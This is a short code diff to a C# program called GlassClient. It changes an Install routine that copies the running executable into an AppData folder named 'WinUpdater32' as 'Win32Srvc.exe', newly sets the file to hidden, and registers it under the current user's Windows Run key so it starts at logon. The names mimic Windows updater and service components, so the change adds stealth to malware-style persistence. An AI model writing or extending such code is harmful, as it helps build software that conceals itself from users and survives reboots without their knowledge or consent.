@@ -16,12 +16,14 @@ namespace GlassClient
         public void Install()
         {
             string destPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinUpdater32";
+            string filePath = destPath + "\\Win32Srvc.exe";
             if (!Directory.Exists(destPath))
             {
                 Directory.CreateDirectory(destPath);
-                File.Copy(Assembly.GetEntryAssembly().Location, destPath + "\\Win32Srvc.exe");
+                File.Copy(Assembly.GetEntryAssembly().Location, filePath);
+                File.SetAttributes(filePath, FileAttributes.Hidden);
                 RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                add.SetValue(APP_NAME, "\"" + destPath + "\\Win32Srvc.exe\"");
+                add.SetValue(APP_NAME, "\"" + filePath + "\"");
             }
         }
     }
